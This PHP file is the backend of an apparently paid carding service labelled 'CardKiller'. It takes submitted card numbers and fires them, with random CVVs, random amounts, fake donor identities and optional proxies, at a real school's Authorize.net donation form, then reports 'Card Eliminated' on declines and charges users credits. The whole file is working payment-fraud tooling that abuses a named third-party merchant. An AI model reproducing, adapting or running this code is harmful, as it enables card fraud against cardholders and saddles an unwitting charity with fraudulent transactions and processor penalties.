<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php';
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
use App\Db;
use App\Telegram;

header('Content-Type: application/json; charset=utf-8');
session_start();

// Validate session
if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}

$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);

// Fetch user details
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, kcoin FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    http_response_code(404);
    echo json_encode(['Response' => 'User not found']);
    exit;
}

$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentKcoin = (int)$userData['kcoin'];

// Restrict access for banned or free users
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.', 'kcoin' => $currentKcoin]);
    exit;
}
// if ($userStatus === 'FREE') {
//     echo json_encode(['Response' => 'This API is only usable for Premium or Admin Users. Please upgrade your Plan.', 'kcoin' => $currentKcoin]);
//     exit;
// }

// Check minimum kcoin (2 required per request)
if ($currentKcoin < 2) {
    echo json_encode(['Response' => 'Insufficient kcoin. Minimum 2 kcoin required.', 'kcoin' => $currentKcoin]);
    exit;
}

// Fetch bot token from .env
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config', 'kcoin' => $currentKcoin]);
    exit;
}

// Proxy setup
$useProxy = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
if ($useProxy) {
    // Prioritize query parameters from the request
    $proxyHost = trim((string)($_GET['host'] ?? ''));
    $proxyPort = trim((string)($_GET['port'] ?? ''));
    $proxyUsername = trim((string)($_GET['user'] ?? ''));
    $proxyPassword = trim((string)($_GET['pass'] ?? ''));
    $proxyType = trim((string)($_GET['pt'] ?? 'http'));

    // Fallback to user's default proxy from database if query parameters are missing
    if (empty($proxyHost) || empty($proxyPort) || empty($proxyType)) {
        $stmt = $pdo->prepare("SELECT proxy_host, proxy_port, proxy_username, proxy_password, ptype FROM users WHERE id = ? LIMIT 1");
        $stmt->execute([$uid]);
        $proxyData = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$proxyData) {
            echo json_encode(['Response' => 'User not found', 'kcoin' => $currentKcoin]);
            exit;
        }
        $proxyHost = $proxyHost ?: $proxyData['proxy_host'];
        $proxyPort = $proxyPort ?: $proxyData['proxy_port'];
        $proxyUsername = $proxyUsername ?: ($proxyData['proxy_username'] ?? '');
        $proxyPassword = $proxyPassword ?: ($proxyData['proxy_password'] ?? '');
        $proxyType = $proxyType ?: ($proxyData['ptype'] ?? 'http');
    }

    if (empty($proxyHost) || empty($proxyPort) || empty($proxyType)) {
        echo json_encode(['Response' => 'Valid proxy details required', 'kcoin' => $currentKcoin]);
        exit;
    }

    $proxy = "$proxyType://";
    if (!empty($proxyUsername) && !empty($proxyPassword)) {
        $proxy .= "$proxyUsername:$proxyPassword@";
    }
    $proxy .= "$proxyHost:$proxyPort";
} else {
    $proxy = '';
}
// Validate input
$cc1 = trim((string)($_GET['cc'] ?? ''));
if (!preg_match('/^(\d{13,19})[|\/](\d{1,2})[|\/](\d{2,4})[|\/](\d{3,4})$/', $cc1, $m)) {
    echo json_encode(['Response' => 'Invalid Card Format', 'kcoin' => $currentKcoin]);
    exit;
}
$cc = $m[1];
$month = str_pad((string)((int)$m[2]), 2, '0', STR_PAD_LEFT);
$year = $m[3];
$year = strlen($year) <= 2 ? '20' . $year : $year;
$cvv = $m[4];
$exp_date = $month . substr($year, -2);

// Determine if it's an Amex card
$is_amex = (strlen($cc) == 15);

// Helper functions
function generateUserAgent(): string {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}

function getBinInfo(string $binNumber, $ch): array {
    $url = "https://bins.antipublic.cc/bins/" . urlencode($binNumber);
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}

function generateRandomCvv(bool $is_amex): string {
    $length = $is_amex ? 4 : 3;
    $cvv = '';
    for ($i = 0; $i < $length; $i++) {
        $cvv .= random_int(0, 9);
    }
    return str_pad($cvv, $length, '0', STR_PAD_LEFT);
}

function getRandomInfo(): array {
    $names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
    $states = ['California', 'Texas', 'New York', 'Florida', 'Illinois'];
    $state_abbr = ['CA', 'TX', 'NY', 'FL', 'IL'];
    return [
        'fname' => $names[array_rand($names)],
        'lname' => $names[array_rand($names)],
        'email' => strtolower($names[array_rand($names)]) . '@gmail.com',
        'phone' => '555' . rand(100, 999) . rand(1000, 9999),
        'add1' => rand(100, 999) . ' ' . $cities[array_rand($cities)] . ' St',
        'city' => $cities[array_rand($cities)],
        'state' => $states[array_rand($cities)],
        'state_short' => $state_abbr[array_rand($state_abbr)],
        'zip' => rand(10000, 99999)
    ];
}

function updateKcoin($pdo, $uid, int $deduct): int {
    global $currentKcoin;
    $newKcoin = max(0, $currentKcoin - $deduct);
    $stmt = $pdo->prepare("UPDATE users SET kcoin = ? WHERE id = ?");
    $stmt->execute([$newKcoin, $uid]);
    return $newKcoin;
}

function gets(string $string, string $start, string $end): string {
    $startPos = strpos($string, $start);
    if ($startPos === false) return '';
    $startPos += strlen($start);
    $endPos = strpos($string, $end, $startPos);
    return $endPos === false ? '' : substr($string, $startPos, $endPos - $startPos);
}

function sendTelegramMessage($botToken, $chatId, $messageHtml): bool {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}

// Initialize cURL for BIN info
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
]);

// Initialize cURL for payment requests
curl_setopt($ch, CURLOPT_COOKIEJAR, tempnam(sys_get_temp_dir(), 'cookie'));
curl_setopt($ch, CURLOPT_COOKIEFILE, tempnam(sys_get_temp_dir(), 'cookie'));
curl_setopt($ch, CURLOPT_PROXY, $proxy ? $proxy : null); // Re-apply proxy for payment requests

// Fetch BIN information
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $ch);
$brand = $binInfo['brand'];
$card_type = $binInfo['card_type'];
$level = $binInfo['level'];
$issuer = $binInfo['issuer'];
$country_info = $binInfo['country_info'];

// Generate random amount and CVV
$amount = rand(500, 10000);
$cvv = generateRandomCvv($is_amex);
$agent = generateUserAgent();

// First GET request to fetch form hash, client key, and API login ID
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.9',
    'user-agent: ' . $agent,
];
$params = [
    'form-id' => '1940',
    'payment-mode' => 'authorize',
    'level-id' => '3'
];
$url = 'https://sechristianschool.org/cheerful-giving-year-end-campaign/?' . http_build_query($params);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode(['Response' => 'Error: ' . curl_error($ch), 'Gateway' => 'CardKiller', 'cc' => $cc1, 'kcoin' => $currentKcoin]);
    exit;
}
$hash = gets($response, 'name="give-form-hash" value="', '"');
$key = gets($response, 'authData.clientKey = "', '"');
$apiId = gets($response, 'authData.apiLoginID = "', '"');
if (!$hash || !$key || !$apiId) {
    curl_close($ch);
    echo json_encode(['Response' => 'Error: Could not extract required tokens', 'Gateway' => 'CardKiller', 'cc' => $cc1, 'kcoin' => $currentKcoin]);
    exit;
}

// Second POST request to Authorize.net
$headers = [
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.6',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Content-Type: application/json; charset=UTF-8',
    'Origin: https://sechristianschool.org',
    'Pragma: no-cache',
    'Referer: https://sechristianschool.org/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'Sec-GPC: 1',
    'User-Agent: ' . $agent,
    'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
];
$json_data = [
    'securePaymentContainerRequest' => [
        'merchantAuthentication' => [
            'name' => $apiId,
            'clientKey' => $key,
        ],
        'data' => [
            'type' => 'TOKEN',
            'id' => '4629f4d8-5a7f-fa82-7f63-38a60a6aa1a0',
            'token' => [
                'cardNumber' => $cc,
                'expirationDate' => $exp_date,
                'cardCode' => $cvv,
            ],
        ],
    ],
];
curl_setopt($ch, CURLOPT_URL, 'https://api2.authorize.net/xml/v1/request.api');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    echo json_encode(['Response' => 'Error: ' . curl_error($ch), 'Gateway' => 'CardKiller', 'cc' => $cc1, 'kcoin' => $currentKcoin]);
    exit;
}
$dataDescriptor = gets($response, '"dataDescriptor":"', '"');
$dataValue = gets($response, '"dataValue":"', '"');
if (!$dataDescriptor || !$dataValue) {
    curl_close($ch);
    echo json_encode(['Response' => 'Error: Could not extract payment tokens', 'Gateway' => 'CardKiller', 'cc' => $cc1, 'kcoin' => $currentKcoin]);
    exit;
}

// Third POST request to submit payment
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.6',
    'cache-control: no-cache',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://sechristianschool.org',
    'pragma: no-cache',
    'priority: u=0, i',
    'referer: https://sechristianschool.org/cheerful-giving-year-end-campaign/?form-id=1940&payment-mode=authorize&level-id=3',
    'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $agent,
];
$params = [
    'payment-mode' => 'authorize',
    'form-id' => '1940',
];
$random_data = getRandomInfo();
$fname = $random_data['fname'];
$lname = $random_data['lname'];
$add1 = $random_data['add1'];
$city = $random_data['city'];
$state_short = $random_data['state_short'];
$zip = $random_data['zip'];
$user = "$fname" . rand(9999, 574545);
$data = [
    'give-honeypot' => '',
    'give-form-id-prefix' => '1940-1',
    'give-form-id' => '1940',
    'give-form-title' => 'Cheerful Giving Year End Donation',
    'give-current-url' => 'https://sechristianschool.org/cheerful-giving-year-end-campaign/',
    'give-form-url' => 'https://sechristianschool.org/cheerful-giving-year-end-campaign/',
    'give-form-minimum' => '5.00',
    'give-form-maximum' => '999999.99',
    'give-form-hash' => $hash,
    'give-price-id' => 'custom',
    'give-recurring-logged-in-only' => '',
    'give-logged-in-only' => '1',
    '_give_is_donation_recurring' => '0',
    'give_recurring_donation_details' => '{"give_recurring_option":"yes_donor"}',
    'donation_selection' => 'General & Enrollment',
    'give-amount' => $amount,
    'payment-mode' => 'authorize',
    'give_first' => $fname,
    'give_last' => $lname,
    'give_email' => "$user@gmail.com",
    'give_comment' => '',
    'card_number' => '0000000000000000',
    'card_cvc' => '000',
    'card_name' => '0000000000000000',
    'card_exp_month' => '00',
    'card_exp_year' => '00',
    'card_expiry' => '00 / 00',
    'billing_country' => 'US',
    'card_address' => $add1,
    'card_address_2' => '',
    'card_city' => $city,
    'card_state' => $state_short,
    'card_zip' => $zip,
    'give_authorize_data_descriptor' => $dataDescriptor,
    'give_authorize_data_value' => $dataValue,
    'give_action' => 'purchase',
    'give-gateway' => 'authorize',
];
$url = 'https://sechristianschool.org/cheerful-giving-year-end-campaign/?' . http_build_query($params);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
$curlErr = curl_error($ch);
$httpCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ---------- small debug log (optional) ----------
// $file = "ppcvv2_cc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
// fwrite($handle, $content);
// fclose($handle);

// Process response
$result = gets($response, '<strong>Error</strong>', '</p>');
$status = (strpos($result, 'was declined') !== false) ? 'valid' : 'invalid';
$responseText = $status === 'valid' ? 'Card Eliminated ✅' : 'Elimination Failed ❌';

// Deduct kcoin (2 per request, no hits/charge/live increments)
$newKcoin = updateKcoin($pdo, $uid, 1);

// Respond to client
echo json_encode([
    'status' => $status,
    'Response' => $responseText,
    'Gateway' => 'CardKiller',
    'cc' => $cc1,
    'brand' => $brand,
    'card_type' => $card_type,
    'level' => $level,
    'issuer' => $issuer,
    'country_info' => $country_info,
    'kcoin' => $newKcoin
]);
exit;